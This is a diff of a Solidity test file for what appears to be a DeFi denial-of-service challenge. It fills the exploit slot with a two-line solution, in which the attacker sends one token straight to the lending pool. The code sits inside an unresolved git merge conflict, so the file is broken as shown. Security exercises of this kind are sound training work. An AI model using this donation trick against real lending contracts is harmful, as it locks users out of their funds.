@@ -42,8 +42,12 @@ contract dosLenderTest is Test {
         /**
          * CODE YOUR EXPLOIT HERE
          */
+<<<<<<< HEAD
         vm.prank(attacker);
         token.transfer(address(pool), 1);
+=======
+
+>>>>>>> main
         /**
          * SUCCESS CONDITIONS
          */
